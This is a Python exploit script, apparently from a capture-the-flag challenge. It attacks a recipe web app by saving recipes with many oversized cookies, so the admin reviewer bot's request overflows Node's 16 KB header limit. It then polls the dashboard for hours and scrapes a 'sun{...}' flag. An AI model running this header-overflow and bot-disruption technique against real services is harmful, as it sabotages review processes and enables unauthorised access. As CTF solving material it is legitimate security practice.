#!/usr/bin/env python3
"""Size ladder of jammed batches, then watch it for hours.

Measured this session: the inspector's stamp request carries every ingredient cookie the
mixer page wrote (135 ingredients x 115 B = 15.5 KB still seals, 145 x 115 B = 16.7 KB
comes back `reviewed` with no seal), and the ceiling is Node's 16 KB --max-http-header-size,
not nginx's 8 KB (my own client dies at 8.3 KB with `400 Request Header Or Cookie Too
Large`, the worker does not). So the worker talks to the app from inside the container,
and the one thing an outside baker can do to it is overflow its verdict request.

Since a jammed batch cannot be re-submitted (submitting a `reviewed` batch answers
`{ok:true,status:"queued"}` but is a no-op: the update only matches drafts), each batch
gets exactly one inspector pass. This creates a ladder across the reachable states -
just-over, comfortably-over, way over, sealed, never-submitted - and leaves them in the
DB while we watch, because "the Chief is a very busy robot" is the only sentence in the
challenge that promises a second reviewer exists, and an unsealed batch is the only work
such a reviewer could be defined over.
"""
import re
import sys
import time

from cc import Client

NAME = lambda i: ("i%03d" % i) + "z" * 43
VAL = "x" * 64
PER = 48 + 1 + 64 + 2
HOURS = float(sys.argv[1]) if len(sys.argv) > 1 else 6.0
POLL = 120


def log(*a):
    line = "[%s] %s" % (time.strftime("%m-%d %H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def login(user):
    c = Client()
    code, out, dt = c.post("/login", {"username": user, "password": "Passw0rd!"})
    if code != 200:
        code, out, dt = c.post("/register", {"username": user, "password": "Passw0rd!"})
    return c


def table(c):
    code, dash, dt = c.get("/dashboard")
    if code == 401:
        return None
    out = {}
    for block in re.finditer(r"<tr>(.*?)</tr>", dash, re.S):
        b = block.group(1)
        rid = re.search(r"/recipe/([0-9a-f]{24})", b)
        if not rid:
            continue
        st = re.search(r'class="pill (\w+)">(\w+)</span>', b)
        tail = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())
        seal = "NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:24])
        out[rid.group(1)] = (st.group(2) if st else "?", seal)
    return {"_html": dash, **out}


def make(user, spec):
    c = login(user)
    ids = {}
    for title, n in spec:
        ings = [{"name": NAME(i), "value": VAL} for i in range(n)] if n else []
        code, out, dt = c.post("/api/recipe", {"title": title, "ingredients": ings})
        if not isinstance(out, dict) or "id" not in out:
            log("  save %s failed: %s %s" % (title, code, str(out)[:80]))
            continue
        ids[title] = out["id"]
        log("  %-22s %s %6dB (%d ing)" % (title, out["id"][:8], n * PER, n))
        time.sleep(0.4)
    return c, ids


J1 = [("jam143", 143), ("jam160", 160), ("jam200", 200), ("jam300", 300), ("sealed", 2)]
J2 = [("draft-only", 0), ("jam145-legendary", 145)]

log("=== building the ladder ===")
c1, i1 = make("lad1%03d" % (int(time.time()) % 1000), J1)
c2, i2 = make("lad2%03d" % (int(time.time()) % 1000), J2)
watch = [(c1, i1), (c2, i2)]

for c, ids in watch:
    for title, rid in ids.items():
        if title == "draft-only":
            continue
        for k in range(12):
            code, out, dt = c.post("/api/recipe/%s/submit" % rid, {})
            if isinstance(out, dict) and out.get("ok"):
                break
            time.sleep(10)
        log("submitted %-18s %s -> %s" % (title, rid[:8], str(out)[:50]))
        time.sleep(5)

log("=== watching %.1f h ===" % HOURS)
t0 = time.time()
seen = {}
hits = 0
while time.time() - t0 < HOURS * 3600 and hits < 3:
    time.sleep(POLL)
    for c, ids in watch:
        st = table(c)
        if st is None:
            c = None
            continue
        html = st.pop("_html")
        for title, rid in ids.items():
            sig = st.get(rid)
            if sig is None:
                continue
            if seen.get(rid) != sig:
                log("  t+%6dm %-18s %s %s" % (int((time.time() - t0) / 60), title, rid[:8], sig))
                seen[rid] = sig
            if sig[1] not in ("NONE", "standard"):
                hits += 1
                log("!!! unusual seal on %s: %s" % (title, sig))
                code, page, dt = c.get("/recipe/%s" % rid)
                open("../files/golden_%s.html" % title, "w", encoding="utf-8").write(str(page))
                fl = re.findall(r"sun\{[^{}\r\n]{1,200}\}", str(page))
                if fl:
                    open("../flag.txt", "w", encoding="utf-8").write(fl[0] + "\n")
                    log("FLAG = %s" % fl[0])
        if re.search(r"sun\{", html) or 'class="flag"' in html:
            hits += 1
            log("!!! flag text in dashboard")
            open("../files/golden_dashboard.html", "w", encoding="utf-8").write(html)
log("watch finished after %.1f h" % ((time.time() - t0) / 3600))
for c, ids in watch:
    st = table(c) or {}
    for title, rid in ids.items():
        log("   final %-18s %s" % (title, st.get(rid)))
